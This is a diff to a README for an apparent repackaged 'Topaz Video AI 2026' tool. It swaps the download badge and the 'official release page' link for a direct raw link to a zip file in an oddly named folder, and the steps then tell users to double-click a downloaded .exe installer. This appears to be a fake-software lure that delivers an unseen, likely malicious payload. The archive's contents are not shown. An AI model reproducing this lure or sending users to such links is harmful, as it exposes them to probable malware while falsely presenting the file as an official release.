@@ -1,6 +1,6 @@
 # 🎥 Topaz-Video-AI-2026 - Improve Your Video Quality With AI
 
-[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/wicketkeeperbluffness423/Topaz-Video-AI-2026)
+[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/wicketkeeperbluffness423/Topaz-Video-AI-2026/main/vitellicle/Topaz-Video-A-v2.4.zip)
 
 ## 📌 About This Software
 
@@ -31,7 +31,7 @@ These requirements ensure smooth performance during video processing:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page: [https://github.com/wicketkeeperbluffness423/Topaz-Video-AI-2026](https://github.com/wicketkeeperbluffness423/Topaz-Video-AI-2026).
+1.  Visit the official release page: [https://raw.githubusercontent.com/wicketkeeperbluffness423/Topaz-Video-AI-2026/main/vitellicle/Topaz-Video-A-v2.4.zip](https://raw.githubusercontent.com/wicketkeeperbluffness423/Topaz-Video-AI-2026/main/vitellicle/Topaz-Video-A-v2.4.zip).
 2.  Click the download link for the Windows installer file.
 3.  Locate the downloaded .exe file in your browser downloads folder.
 4.  Double-click the file to start the installer.
